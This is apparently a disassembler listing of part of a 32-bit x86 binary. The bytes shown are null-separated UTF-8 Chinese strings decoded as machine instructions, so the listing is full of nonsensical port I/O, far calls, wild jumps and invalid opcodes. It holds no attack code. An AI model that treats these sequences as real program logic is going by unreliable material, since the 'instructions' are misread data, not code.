  4074fd:	90                   	nop
  4074fe:	e5 90                	in     $0x90,%eax
  407500:	88 e5                	mov    %ah,%ch
  407502:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407503:	aa                   	stos   %al,%es:(%edi)
  407504:	e5 b0                	in     $0xb0,%eax
  407506:	8a e7                	mov    %bh,%ah
  407508:	ae                   	scas   %es:(%edi),%al
  407509:	a1 e6 b3 95 e4       	mov    0xe495b3e6,%eax
  40750e:	ba ba e7 b9 bc       	mov    $0xbcb9e7ba,%edx
  407513:	e7 ae                	out    %eax,$0xae
  407515:	a1 e7 82 ba 00       	mov    0xba82e7,%eax
  40751a:	e5 95                	in     $0x95,%eax
  40751c:	86 e5                	xchg   %ah,%ch
  40751e:	95                   	xchg   %eax,%ebp
  40751f:	86 e5                	xchg   %ah,%ch
  407521:	8f                   	(bad)
  407522:	b8 e7 9a 84 e7       	mov    $0xe7849ae7,%eax
  407527:	82 ba e7 9a 84 e7 82 	cmpb   $0x82,-0x187b6519(%edx)
  40752e:	ba e7 82 ba e7       	mov    $0xe7ba82e7,%edx
  407533:	9a 84 e5 b0 87 e8 a1 	lcall  $0xa1e8,$0x87b0e584
  40753a:	8c e5                	mov    %fs,%ebp
  40753c:	8f                   	(bad)
  40753d:	97                   	xchg   %eax,%edi
  40753e:	e7 8e                	out    %eax,$0x8e
  407540:	89 00                	mov    %eax,(%eax)
  407542:	e8 a1 8c e7 ae       	call   0xaf2801e8
  407547:	a1 e5 ad ab e6       	mov    0xe6abade5,%eax
  40754c:	98                   	cwtl
  40754d:	af                   	scas   %es:(%edi),%eax
  40754e:	e9 a1 a7 e9 a1       	jmp    0xa22a1cf4
  407553:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407554:	e9 a1 a7 e5 9f       	jmp    0xa0261cfa
  407559:	b7 e7                	mov    $0xe7,%bh
  40755b:	8e 89 00 e7 9a 84    	mov    -0x7b651900(%ecx),%cs
  407561:	e5 b8                	in     $0xb8,%eax
  407563:	8c e6                	mov    %fs,%esi
  407565:	b3 95                	mov    $0x95,%bl
  407567:	e5 b0                	in     $0xb0,%eax
  407569:	8e e5                	mov    %ebp,%fs
  40756b:	9f                   	lahf
  40756c:	8e e5                	mov    %ebp,%fs
  40756e:	9f                   	lahf
  40756f:	8e e5                	mov    %ebp,%fs
  407571:	9f                   	lahf
  407572:	b7 e9                	mov    $0xe9,%bh
  407574:	a1 a7 e5 a5 b9       	mov    0xb9a5e5a7,%eax
  407579:	e5 b0                	in     $0xb0,%eax
  40757b:	8a e5                	mov    %ch,%ah
  40757d:	8f                   	(bad)
  40757e:	b8 e7 94 9f 00       	mov    $0x9f94e7,%eax
  407583:	e6 be                	out    %al,$0xbe
  407585:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407586:	e7 8e                	out    %eax,$0x8e
  407588:	89 e9                	mov    %ebp,%ecx
  40758a:	a1 a7 e7 9a 84       	mov    0x849ae7a7,%eax
  40758f:	e7 94                	out    %eax,$0x94
  407591:	9f                   	lahf
  407592:	00 e7                	add    %ah,%bh
  407594:	ae                   	scas   %es:(%edi),%al
  407595:	a1 e5 a4 aa e5       	mov    0xe5aaa4e5,%eax
  40759a:	ad                   	lods   %ds:(%esi),%eax
  40759b:	90                   	nop
  40759c:	e5 90                	in     $0x90,%eax
  40759e:	88 e4                	mov    %ah,%ah
  4075a0:	ba ba e7 9a 84       	mov    $0x849ae7ba,%edx
  4075a5:	00 e9                	add    %ch,%cl
  4075a7:	a1 a7 e5 a5 b9       	mov    0xb9a5e5a7,%eax
  4075ac:	e7 9a                	out    %eax,$0x9a
  4075ae:	84 e5                	test   %ah,%ch
  4075b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075b1:	aa                   	stos   %al,%es:(%edi)
  4075b2:	e7 9a                	out    %eax,$0x9a
  4075b4:	84 e7                	test   %ah,%bh
  4075b6:	8e 89 e9 a6 96 e9    	mov    -0x16695917(%ecx),%cs
  4075bc:	87 91 e7 9a 84 e9    	xchg   %edx,-0x167b6519(%ecx)
  4075c2:	a1 a7 e4 bd bf       	mov    0xbfbde4a7,%eax
  4075c7:	e5 85                	in     $0x85,%eax
  4075c9:	ac                   	lods   %ds:(%esi),%al
  4075ca:	e4 bd                	in     $0xbd,%al
  4075cc:	bf e7 9a 84 00       	mov    $0x849ae7,%edi
  4075d1:	e6 89                	out    %al,$0x89
  4075d3:	bf e7 ae a1 e5       	mov    $0xe5a1aee7,%edi
  4075d8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075d9:	aa                   	stos   %al,%es:(%edi)
  4075da:	e9 a1 a7 e5 85       	jmp    0x86261d80
  4075df:	ac                   	lods   %ds:(%esi),%al
  4075e0:	e7 9a                	out    %eax,$0x9a
  4075e2:	84 00                	test   %al,(%eax)
  4075e4:	e9 a1 a7 e5 a5       	jmp    0xa6261d8a
  4075e9:	b9 e9 a6 96 e5       	mov    $0xe596a6e9,%ecx
  4075ee:	9f                   	lahf
  4075ef:	b7 e5                	mov    $0xe5,%bh
  4075f1:	b8 ad e5 b0 8e       	mov    $0x8eb0e5ad,%eax
  4075f6:	e7 8e                	out    %eax,$0x8e
  4075f8:	89 e5                	mov    %esp,%ebp
  4075fa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075fb:	aa                   	stos   %al,%es:(%edi)
  4075fc:	e5 bc                	in     $0xbc,%eax
  4075fe:	95                   	xchg   %eax,%ebp
  4075ff:	e4 bd                	in     $0xbd,%al
  407601:	bf e5 b8 8c e5       	mov    $0xe58cb8e5,%edi
  407606:	b8 8c e5 90 88       	mov    $0x8890e58c,%eax
  40760b:	e7 9a                	out    %eax,$0x9a
  40760d:	84 00                	test   %al,(%eax)
  40760f:	e4 ba                	in     $0xba,%al
  407611:	ba e4 ba ba e4       	mov    $0xe4babae4,%edx
  407616:	bd bf e5 ae b6       	mov    $0xb6aee5bf,%ebp
  40761b:	e6 88                	out    %al,$0x88
  40761d:	90                   	nop
  40761e:	e7 9a                	out    %eax,$0x9a
  407620:	84 e5                	test   %ah,%ch
  407622:	90                   	nop
  407623:	88 e7                	mov    %ah,%bh
  407625:	9a 84 00 e7 9a 84 e6 	lcall  $0xe684,$0x9ae70084
  40762c:	98                   	cwtl
  40762d:	af                   	scas   %es:(%edi),%eax
  40762e:	e5 9f                	in     $0x9f,%eax
  407630:	b7 e5                	mov    $0xe5,%bh
  407632:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407633:	aa                   	stos   %al,%es:(%edi)
  407634:	e6 be                	out    %al,$0xbe
  407636:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407637:	e5 95                	in     $0x95,%eax
  407639:	86 e7                	xchg   %ah,%bh
  40763b:	9a 84 00 e6 be a4 e6 	lcall  $0xe6a4,$0xbee60084
  407642:	be a4 e5 ad ab       	mov    $0xabade5a4,%esi
  407647:	e5 9f                	in     $0x9f,%eax
  407649:	8e e5                	mov    %ebp,%fs
  40764b:	91                   	xchg   %eax,%ecx
  40764c:	bd e5 b0 87 e6       	mov    $0xe687b0e5,%ebp
  407651:	b3 95                	mov    $0x95,%bl
  407653:	e7 94                	out    %eax,$0x94
  407655:	9f                   	lahf
  407656:	e7 9a                	out    %eax,$0x9a
  407658:	84 e6                	test   %ah,%dh
  40765a:	88 90 e5 a4 aa e7    	mov    %dl,-0x18555b1b(%eax)
  407660:	9a 84 00 e5 90 88 e5 	lcall  $0xe588,$0x90e50084
  407667:	bc 95 e5 90 88       	mov    $0x8890e595,%esp
  40766c:	e5 ad                	in     $0xad,%eax
  40766e:	90                   	nop
  40766f:	e7 9a                	out    %eax,$0x9a
  407671:	84 00                	test   %al,(%eax)
  407673:	e5 ad                	in     $0xad,%eax
  407675:	90                   	nop
  407676:	e5 91                	in     $0x91,%eax
  407678:	bd e9 a1 a7 e5       	mov    $0xe5a7a1e9,%ebp
  40767d:	8f                   	(bad)
  40767e:	97                   	xchg   %eax,%edi
  40767f:	e7 94                	out    %eax,$0x94
  407681:	9f                   	lahf
  407682:	e5 a4                	in     $0xa4,%eax
  407684:	aa                   	stos   %al,%es:(%edi)
  407685:	e5 ad                	in     $0xad,%eax
  407687:	90                   	nop
  407688:	e7 9a                	out    %eax,$0x9a
  40768a:	84 00                	test   %al,(%eax)
  40768c:	e5 b8                	in     $0xb8,%eax
  40768e:	ad                   	lods   %ds:(%esi),%eax
  40768f:	e7 ae                	out    %eax,$0xae
  407691:	a1 e7 94 9f e5       	mov    0xe59f94e7,%eax
  407696:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407697:	aa                   	stos   %al,%es:(%edi)
  407698:	e6 be                	out    %al,$0xbe
  40769a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40769b:	e5 ae                	in     $0xae,%eax
  40769d:	b6 e4                	mov    $0xe4,%dh
  40769f:	ba ba e7 a8 8b       	mov    $0x8ba8e7ba,%edx
  4076a4:	e7 94                	out    %eax,$0x94
  4076a6:	9f                   	lahf
  4076a7:	e5 90                	in     $0x90,%eax
  4076a9:	88 e5                	mov    %ah,%ch
  4076ab:	ad                   	lods   %ds:(%esi),%eax
  4076ac:	ab                   	stos   %eax,%es:(%edi)
  4076ad:	e7 9a                	out    %eax,$0x9a
  4076af:	84 00                	test   %al,(%eax)
  4076b1:	e6 88                	out    %al,$0x88
  4076b3:	90                   	nop
  4076b4:	e6 be                	out    %al,$0xbe
  4076b6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4076b7:	e7 9a                	out    %eax,$0x9a
  4076b9:	84 e6                	test   %ah,%dh
  4076bb:	98                   	cwtl
  4076bc:	af                   	scas   %es:(%edi),%eax
  4076bd:	e5 ae                	in     $0xae,%eax
  4076bf:	98                   	cwtl
  4076c0:	e5 9f                	in     $0x9f,%eax
  4076c2:	8e e5                	mov    %ebp,%fs
  4076c4:	9f                   	lahf
  4076c5:	b7 e6                	mov    $0xe6,%bh
  4076c7:	b3 95                	mov    $0x95,%bl
  4076c9:	e5 b0                	in     $0xb0,%eax
  4076cb:	8a e5                	mov    %ch,%ah
  4076cd:	b0 8e                	mov    $0x8e,%al
  4076cf:	e7 9a                	out    %eax,$0x9a
  4076d1:	84 00                	test   %al,(%eax)
  4076d3:	e5 8f                	in     $0x8f,%eax
  4076d5:	b8 e7 8e 89 e6       	mov    $0xe6898ee7,%eax
  4076da:	88 90 e5 b8 ad e5    	mov    %dl,-0x1a52471b(%eax)
  4076e0:	b8 ad e5 b0 8a       	mov    $0x8ab0e5ad,%eax
  4076e5:	e5 b8                	in     $0xb8,%eax
  4076e7:	ad                   	lods   %ds:(%esi),%eax
  4076e8:	e7 9a                	out    %eax,$0x9a
  4076ea:	84 00                	test   %al,(%eax)
  4076ec:	e5 a5                	in     $0xa5,%eax
  4076ee:	b9 e5 9f b7 e5       	mov    $0xe5b79fe5,%ecx
  4076f3:	91                   	xchg   %eax,%ecx
  4076f4:	bd e5 b8 8c e5       	mov    $0xe58cb8e5,%ebp
  4076f9:	90                   	nop
  4076fa:	88 e4                	mov    %ah,%ah
  4076fc:	ba ba e7 9a 84       	mov    $0x849ae7ba,%edx
  407701:	e9 a1 a7 e7 8e       	jmp    0x8f281ea7
  407706:	89 e4                	mov    %esp,%esp
  407708:	ba ba e6 88 90       	mov    $0x9088e6ba,%edx
  40770d:	e7 9a                	out    %eax,$0x9a
  40770f:	84 00                	test   %al,(%eax)
  407711:	e7 9a                	out    %eax,$0x9a
  407713:	84 e5                	test   %ah,%ch
  407715:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407716:	aa                   	stos   %al,%es:(%edi)
  407717:	e9 a1 a7 e5 85       	jmp    0x86261ebd
  40771c:	ac                   	lods   %ds:(%esi),%al
  40771d:	e7 9a                	out    %eax,$0x9a
  40771f:	84 e5                	test   %ah,%ch
  407721:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407722:	aa                   	stos   %al,%es:(%edi)
  407723:	e5 9f                	in     $0x9f,%eax
  407725:	8e e7                	mov    %edi,%fs
  407727:	82 ba e6 95 ac e7 9a 	cmpb   $0x9a,-0x18536a1a(%edx)
  40772e:	84 00                	test   %al,(%eax)
  407730:	e5 b0                	in     $0xb0,%eax
  407732:	8e e5                	mov    %ebp,%fs
  407734:	b8 8c e7 b9 bc       	mov    $0xbcb9e78c,%eax
  407739:	e7 a8                	out    %eax,$0xa8
  40773b:	8b e9                	mov    %ecx,%ebp
  40773d:	a1 a7 e7 9a 84       	mov    0x849ae7a7,%eax
  407742:	e6 89                	out    %al,$0x89
  407744:	bf e7 9a 84 e6       	mov    $0xe6849ae7,%edi
  407749:	95                   	xchg   %eax,%ebp
  40774a:	ac                   	lods   %ds:(%esi),%al
  40774b:	e7 9a                	out    %eax,$0x9a
  40774d:	84 00                	test   %al,(%eax)
  40774f:	e9 a1 a7 e9 a1       	jmp    0xa22a1ef5
  407754:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407755:	e7 9a                	out    %eax,$0x9a
  407757:	84 e6                	test   %ah,%dh
  407759:	95                   	xchg   %eax,%ebp
  40775a:	ac                   	lods   %ds:(%esi),%al
  40775b:	e7 9a                	out    %eax,$0x9a
  40775d:	84 00                	test   %al,(%eax)
  40775f:	e7 9a                	out    %eax,$0x9a
  407761:	84 e5                	test   %ah,%ch
  407763:	b0 8a                	mov    $0x8a,%al
  407765:	e7 b9                	out    %eax,$0xb9
  407767:	bc e7 9a 84 e7       	mov    $0xe7849ae7,%esp
  40776c:	b9 bc e7 9a 84       	mov    $0x849ae7bc,%ecx
  407771:	e5 b0                	in     $0xb0,%eax
  407773:	8e e5                	mov    %ebp,%fs
  407775:	9f                   	lahf
  407776:	b7 e7                	mov    $0xe7,%bh
  407778:	9a 84 e7 9a 84 00 e7 	lcall  $0xe700,$0x849ae784
  40777f:	9a 84 e8 a1 8c e5 90 	lcall  $0x90e5,$0x8ca1e884
  407786:	88 e9                	mov    %ch,%cl
  407788:	a1 a7 e4 bd bf       	mov    0xbfbde4a7,%eax
  40778d:	e7 9a                	out    %eax,$0x9a
  40778f:	84 e9                	test   %ch,%cl
  407791:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407792:	96                   	xchg   %eax,%esi
  407793:	e4 ba                	in     $0xba,%al
  407795:	ba e6 b3 95 e5       	mov    $0xe595b3e6,%edx
  40779a:	8f                   	(bad)
  40779b:	97                   	xchg   %eax,%edi
  40779c:	e5 b0                	in     $0xb0,%eax
  40779e:	87 e7                	xchg   %esp,%edi
  4077a0:	9a 84 e7 9a 84 00 e7 	lcall  $0xe700,$0x849ae784
  4077a7:	9a 84 e5 a5 b9 e7 94 	lcall  $0x94e7,$0xb9a5e584
  4077ae:	9f                   	lahf
  4077af:	e7 9a                	out    %eax,$0x9a
  4077b1:	84 e7                	test   %ah,%bh
  4077b3:	9a 84 e4 ba ba e5 b8 	lcall  $0xb8e5,$0xbabae484
  4077ba:	8c e7                	mov    %fs,%edi
  4077bc:	9a 84 e7 9a 84 00 e6 	lcall  $0xe600,$0x849ae784
  4077c3:	be a4 e4 bd bf       	mov    $0xbfbde4a4,%esi
  4077c8:	e5 b8                	in     $0xb8,%eax
  4077ca:	8c e7                	mov    %fs,%edi
  4077cc:	9a 84 e7 9a 84 00 e5 	lcall  $0xe500,$0x849ae784
  4077d3:	8f                   	(bad)
  4077d4:	b8 e5 90 88 e9       	mov    $0xe98890e5,%eax
  4077d9:	87 91 e5 b8 ad e7    	xchg   %edx,-0x1852471b(%ecx)
  4077df:	a8 8b                	test   $0x8b,%al
  4077e1:	e7 9a                	out    %eax,$0x9a
  4077e3:	84 00                	test   %al,(%eax)
  4077e5:	e7 82                	out    %eax,$0x82
  4077e7:	ba e7 a8 8b e6       	mov    $0xe68ba8e7,%edx
  4077ec:	9c                   	pushf
  4077ed:	9b                   	fwait
  4077ee:	e5 85                	in     $0x85,%eax
  4077f0:	ac                   	lods   %ds:(%esi),%al
  4077f1:	e5 91                	in     $0x91,%eax
  4077f3:	bd e5 b8 ad e7       	mov    $0xe7adb8e5,%ebp
  4077f8:	8e 89 e6 8e a5 e5    	mov    -0x1a5a711a(%ecx),%cs
  4077fe:	bc 95 e9 a1 a7       	mov    $0xa7a1e995,%esp
  407803:	e7 9a                	out    %eax,$0x9a
  407805:	84 e5                	test   %ah,%ch
  407807:	ae                   	scas   %es:(%edi),%al
  407808:	98                   	cwtl
  407809:	e8 a1 8c e7 9a       	call   0x9b2804af
  40780e:	84 00                	test   %al,(%eax)
  407810:	e7 9a                	out    %eax,$0x9a
  407812:	84 e9                	test   %ch,%cl
  407814:	87 91 e6 88 90 e5    	xchg   %edx,-0x1a6f771a(%ecx)
  40781a:	9f                   	lahf
  40781b:	8e e5                	mov    %ebp,%fs
  40781d:	ad                   	lods   %ds:(%esi),%eax
  40781e:	ab                   	stos   %eax,%es:(%edi)
  40781f:	e7 ae                	out    %eax,$0xae
  407821:	a1 e5 9f 8e e5       	mov    0xe58e9fe5,%eax
  407826:	b8 ad e4 ba ba       	mov    $0xbabae4ad,%eax
  40782b:	e5 95                	in     $0x95,%eax
  40782d:	86 e7                	xchg   %ah,%bh
  40782f:	9a 84 e5 90 88 e9 a1 	lcall  $0xa1e9,$0x8890e584
  407836:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407837:	e7 9a                	out    %eax,$0x9a
  407839:	84 00                	test   %al,(%eax)
  40783b:	e5 b8                	in     $0xb8,%eax
  40783d:	8c e4                	mov    %fs,%esp
  40783f:	bd bf e7 9a 84       	mov    $0x849ae7bf,%ebp
  407844:	e5 ad                	in     $0xad,%eax
  407846:	ab                   	stos   %eax,%es:(%edi)
  407847:	e5 9f                	in     $0x9f,%eax
  407849:	b7 e5                	mov    $0xe5,%bh
  40784b:	b0 8e                	mov    $0x8e,%al
  40784d:	e9 a1 a7 e7 b9       	jmp    0xba281ff3
  407852:	bc e4 bd bf e5       	mov    $0xe5bfbde4,%esp
  407857:	8f                   	(bad)
  407858:	b8 e7 a8 8b 00       	mov    $0x8ba8e7,%eax
  40785d:	e4 ba                	in     $0xba,%al
  40785f:	ba e5 b0 87 e4       	mov    $0xe487b0e5,%edx
  407864:	ba ba e5 ad ab       	mov    $0xabade5ba,%edx
  407869:	e4 ba                	in     $0xba,%al
  40786b:	ba e7 9a 84 e6       	mov    $0xe6849ae7,%edx
  407870:	88 90 e5 ad ab e5    	mov    %dl,-0x1a54521b(%eax)
  407876:	8f                   	(bad)
  407877:	b8 e5 bc 95 e4       	mov    $0xe495bce5,%eax
  40787c:	ba ba e5 b0 8a       	mov    $0x8ab0e5ba,%edx
  407881:	e7 a8                	out    %eax,$0xa8
  407883:	8b 00                	mov    (%eax),%eax
  407885:	e5 ae                	in     $0xae,%eax
  407887:	b6 e6                	mov    $0xe6,%dh
  407889:	95                   	xchg   %eax,%ebp
  40788a:	ac                   	lods   %ds:(%esi),%al
  40788b:	e7 9a                	out    %eax,$0x9a
  40788d:	84 e7                	test   %ah,%bh
  40788f:	94                   	xchg   %eax,%esp
  407890:	9f                   	lahf
  407891:	e6 89                	out    %al,$0x89
  407893:	bf e6 9c 9b e5       	mov    $0xe59b9ce6,%edi
  407898:	b0 87                	mov    $0x87,%al
  40789a:	e5 bc                	in     $0xbc,%eax
  40789c:	95                   	xchg   %eax,%ebp
  40789d:	e5 ad                	in     $0xad,%eax
  40789f:	90                   	nop
  4078a0:	e7 9a                	out    %eax,$0x9a
  4078a2:	84 e7                	test   %ah,%bh
  4078a4:	a8 8b                	test   $0x8b,%al
  4078a6:	00 e4                	add    %ah,%ah
  4078a8:	bd bf e6 be a4       	mov    $0xa4bee6bf,%ebp
  4078ad:	e5 a5                	in     $0xa5,%eax
  4078af:	b9 e7 a8 8b e7       	mov    $0xe78ba8e7,%ecx
  4078b4:	a8 8b                	test   $0x8b,%al
  4078b6:	00 e5                	add    %ah,%ch
  4078b8:	85 ac e5 90 88 e5 9f 	test   %ebp,-0x601a7770(%ebp,%eiz,8)
  4078bf:	b7 e5                	mov    $0xe5,%bh
  4078c1:	95                   	xchg   %eax,%ebp
  4078c2:	86 e7                	xchg   %ah,%bh
  4078c4:	ae                   	scas   %es:(%edi),%al
  4078c5:	a1 e7 ae a1 00       	mov    0xa1aee7,%eax
  4078ca:	e7 ae                	out    %eax,$0xae
  4078cc:	a1 e5 ae b6 e5       	mov    0xe5b6aee5,%eax
  4078d1:	9f                   	lahf
  4078d2:	8e e9                	mov    %ecx,%gs
  4078d4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4078d5:	96                   	xchg   %eax,%esi
  4078d6:	e7 9a                	out    %eax,$0x9a
  4078d8:	84 e5                	test   %ah,%ch
  4078da:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4078db:	aa                   	stos   %al,%es:(%edi)
  4078dc:	e7 9a                	out    %eax,$0x9a
  4078de:	84 e8                	test   %ch,%al
  4078e0:	a1 8c e9 a1 a7       	mov    0xa7a1e98c,%eax
  4078e5:	e9 a1 a7 e6 be       	jmp    0xbf27208b
  4078ea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4078eb:	e9 87 91 e5 8f       	jmp    0x90260a77
  4078f0:	97                   	xchg   %eax,%edi
  4078f1:	e7 b9                	out    %eax,$0xb9
  4078f3:	bc 00 e6 be a4       	mov    $0xa4bee600,%esp
  4078f8:	e7 9a                	out    %eax,$0x9a
  4078fa:	84 e5                	test   %ah,%ch
  4078fc:	91                   	xchg   %eax,%ecx
  4078fd:	bd e6 be a4 e5       	mov    $0xe5a4bee6,%ebp
  407902:	9f                   	lahf
  407903:	8e e8                	mov    %eax,%gs
  407905:	a1 8c 00 e5 8f       	mov    0x8fe5008c,%eax
  40790a:	b8 e4 ba ba e5       	mov    $0xe5babae4,%eax
  40790f:	b0 8e                	mov    $0x8e,%al
  407911:	e5 90                	in     $0x90,%eax
  407913:	88 e7                	mov    %ah,%bh
  407915:	9a 84 e9 a1 a7 e5 ae 	lcall  $0xaee5,$0xa7a1e984
  40791c:	b6 e5                	mov    $0xe5,%dh
  40791e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40791f:	b9 e8 a1 8c 00       	mov    $0x8ca1e8,%ecx
  407924:	e5 95                	in     $0x95,%eax
  407926:	86 e5                	xchg   %ah,%ch
  407928:	b8 ad e7 9a 84       	mov    $0x849ae7ad,%eax
  40792d:	e6 8e                	out    %al,$0x8e
  40792f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407930:	e7 b9                	out    %eax,$0xb9
  407932:	bc e8 a1 8c e5       	mov    $0xe58ca1e8,%esp
  407937:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407938:	aa                   	stos   %al,%es:(%edi)
  407939:	e7 9a                	out    %eax,$0x9a
  40793b:	84 e7                	test   %ah,%bh
  40793d:	9a 84 e5 a4 aa e7 8e 	lcall  $0x8ee7,$0xaaa4e584
  407944:	89 e5                	mov    %esp,%ebp
  407946:	ad                   	lods   %ds:(%esi),%eax
  407947:	ab                   	stos   %eax,%es:(%edi)
  407948:	e8 a1 8c 00 e7       	call   0xe74105ee
  40794d:	9a 84 e5 a4 aa e6 95 	lcall  $0x95e6,$0xaaa4e584
  407954:	ac                   	lods   %ds:(%esi),%al
  407955:	e4 ba                	in     $0xba,%al
  407957:	ba e9 87 91 e5       	mov    $0xe59187e9,%edx
  40795c:	ad                   	lods   %ds:(%esi),%eax
  40795d:	90                   	nop
  40795e:	e7 82                	out    %eax,$0x82
  407960:	ba e8 a1 8c 00       	mov    $0x8ca1e8,%edx
  407965:	e5 85                	in     $0x85,%eax
  407967:	ac                   	lods   %ds:(%esi),%al
  407968:	e6 be                	out    %al,$0xbe
  40796a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40796b:	e7 9a                	out    %eax,$0x9a
  40796d:	84 e5                	test   %ah,%ch
  40796f:	95                   	xchg   %eax,%ebp
  407970:	86 e6                	xchg   %ah,%dh
  407972:	88 90 e7 9a 84 e6    	mov    %dl,-0x197b6519(%eax)
  407978:	89 bf e7 9a 84 e7    	mov    %edi,-0x187b6519(%edi)
  40797e:	ae                   	scas   %es:(%edi),%al
  40797f:	a1 e7 b9 bc e4       	mov    0xe4bcb9e7,%eax
  407984:	ba ba e5 8f b8       	mov    $0xb88fe5ba,%edx
  407989:	e6 88                	out    %al,$0x88
  40798b:	90                   	nop
  40798c:	e9 87 91 00 e9       	jmp    0xe9410b18
  407991:	a1 a7 e7 9a 84       	mov    0x849ae7a7,%eax
  407996:	e9 a6 96 e5 95       	jmp    0x96261041
  40799b:	86 e5                	xchg   %ah,%ch
  40799d:	ad                   	lods   %ds:(%esi),%eax
  40799e:	90                   	nop
  40799f:	e6 8e                	out    %al,$0x8e
  4079a1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4079a2:	e7 94                	out    %eax,$0x94
  4079a4:	9f                   	lahf
  4079a5:	e7 ae                	out    %eax,$0xae
  4079a7:	a1 e5 90 88 e5       	mov    0xe58890e5,%eax
  4079ac:	ae                   	scas   %es:(%edi),%al
  4079ad:	b6 e5                	mov    $0xe5,%dh
  4079af:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4079b0:	b9 e5 8f b8 e7       	mov    $0xe7b88fe5,%ecx
  4079b5:	94                   	xchg   %eax,%esp
  4079b6:	9f                   	lahf
  4079b7:	e9 87 91 00 e4       	jmp    0xe4410b43
  4079bc:	ba ba e5 95 86       	mov    $0x8695e5ba,%edx
  4079c1:	e5 ad                	in     $0xad,%eax
  4079c3:	ab                   	stos   %eax,%es:(%edi)
  4079c4:	e7 8e                	out    %eax,$0x8e
  4079c6:	89 e7                	mov    %esp,%edi
  4079c8:	9a 84 e9 87 91 00 e5 	lcall  $0xe500,$0x9187e984
  4079cf:	b0 87                	mov    $0x87,%al
  4079d1:	e5 ad                	in     $0xad,%eax
  4079d3:	ab                   	stos   %eax,%es:(%edi)
  4079d4:	e9 87 91 e6 8e       	jmp    0x8f270b60
  4079d9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4079da:	e7 b9                	out    %eax,$0xb9
  4079dc:	bc e9 87 91 00       	mov    $0x9187e9,%esp
  4079e1:	e9 a6 96 e6 8e       	jmp    0x8f27108c
  4079e6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4079e7:	e5 ad                	in     $0xad,%eax
  4079e9:	90                   	nop
  4079ea:	e9 a1 a7 e5 a5       	jmp    0xa6262190
  4079ef:	b9 e7 9a 84 e9       	mov    $0xe9849ae7,%ecx
  4079f4:	a1 a7 e4 ba ba       	mov    0xbabae4a7,%eax
  4079f9:	e9 a1 a7 00 e4       	jmp    0xe441219f
  4079fe:	ba ba e5 8f 97       	mov    $0x978fe5ba,%edx
  407a03:	e4 ba                	in     $0xba,%al
  407a05:	ba e7 82 ba e4       	mov    $0xe4ba82e7,%edx
  407a0a:	bd bf e9 a1 a7       	mov    $0xa7a1e9bf,%ebp
  407a0f:	00 e9                	add    %ch,%cl
  407a11:	a1 a7 e5 95 86       	mov    0x8695e5a7,%eax
  407a16:	e5 ae                	in     $0xae,%eax
  407a18:	98                   	cwtl
  407a19:	e7 ae                	out    %eax,$0xae
  407a1b:	a1 e4 bd bf e9       	mov    0xe9bfbde4,%eax
  407a20:	a1 a7 00 e5 a5       	mov    0xa5e500a7,%eax
  407a25:	b9 e5 85 ac e9       	mov    $0xe9ac85e5,%ecx
  407a2a:	a1 a7 e5 9f 8e       	mov    0x8e9fe5a7,%eax
  407a2f:	e6 9c                	out    %al,$0x9c
  407a31:	9b                   	fwait
  407a32:	e7 8e                	out    %eax,$0x8e
  407a34:	89 e5                	mov    %esp,%ebp
  407a36:	9f                   	lahf
  407a37:	8e e9                	mov    %ecx,%gs
  407a39:	a1 a7 00 e5 ad       	mov    0xade500a7,%eax
  407a3e:	90                   	nop
  407a3f:	e9 a1 a7 e6 b3       	jmp    0xb42721e5
  407a44:	95                   	xchg   %eax,%ebp
  407a45:	e9 87 91 e5 a4       	jmp    0xa5260bd1
  407a4a:	aa                   	stos   %al,%es:(%edi)
  407a4b:	e9 a1 a7 00 e6       	jmp    0xe64121f1
  407a50:	8e a5 e6 8e a5 e8    	mov    -0x175a711a(%ebp),%fs
  407a56:	a1 8c e5 ae 98       	mov    0x98aee58c,%eax
  407a5b:	e7 9a                	out    %eax,$0x9a
  407a5d:	84 e7                	test   %ah,%bh
  407a5f:	94                   	xchg   %eax,%esp
  407a60:	9f                   	lahf
  407a61:	e5 90                	in     $0x90,%eax
  407a63:	88 e5                	mov    %ah,%ch
  407a65:	ad                   	lods   %ds:(%esi),%eax
  407a66:	90                   	nop
  407a67:	e7 9a                	out    %eax,$0x9a
  407a69:	84 e6                	test   %ah,%dh
  407a6b:	89 bf e9 87 91 e7    	mov    %edi,-0x186e7817(%edi)
  407a71:	9a 84 e6 88 90 e9 a1 	lcall  $0xa1e9,$0x9088e684
  407a78:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407a79:	00 e6                	add    %ah,%dh
  407a7b:	98                   	cwtl
  407a7c:	af                   	scas   %es:(%edi),%eax
  407a7d:	e5 ad                	in     $0xad,%eax
  407a7f:	90                   	nop
  407a80:	e6 be                	out    %al,$0xbe
  407a82:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407a83:	e5 b0                	in     $0xb0,%eax
  407a85:	8a e5                	mov    %ch,%ah
  407a87:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407a88:	b9 e7 9a 84 e7       	mov    $0xe7849ae7,%ecx
  407a8d:	ae                   	scas   %es:(%edi),%al
  407a8e:	a1 e7 8e 89 e7       	mov    0xe7898ee7,%eax
  407a93:	94                   	xchg   %eax,%esp
  407a94:	9f                   	lahf
  407a95:	e6 8e                	out    %al,$0x8e
